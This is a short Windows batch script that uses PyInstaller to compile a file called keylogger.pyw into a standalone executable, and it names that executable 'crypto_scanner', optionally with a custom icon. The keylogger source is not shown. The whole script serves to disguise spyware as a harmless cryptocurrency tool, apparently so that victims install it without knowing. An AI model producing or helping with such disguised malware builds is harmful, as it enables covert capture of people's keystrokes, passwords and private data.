if exist icon.ico (
    pyinstaller --onefile --name crypto_scanner --icon=icon.ico keylogger.pyw
) else (
    pyinstaller --onefile --name crypto_scanner keylogger.pyw
)